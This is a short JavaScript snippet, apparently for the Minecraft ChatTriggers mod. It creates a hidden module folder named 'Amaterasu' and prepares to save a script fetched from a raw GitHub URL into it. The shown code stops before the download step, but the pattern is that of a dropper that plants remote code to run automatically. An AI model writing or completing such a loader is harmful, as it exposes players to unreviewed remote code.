const File = Java.type('java.io.File');
const System = Java.type('java.lang.System');

const appData = System.getenv("APPDATA");

// Path to ChatTriggers module folder
const targetPath = new File(appData + "/.minecraft/config/ChatTriggers/modules/Amaterasu");
targetPath.mkdirs(); // Create folders if needed

// Destination file
const file = new File(targetPath, "script.js");

// Correct GitHub raw file URL
const url = "https://raw.githubusercontent.com/satnnyy/test1/main/b.js";
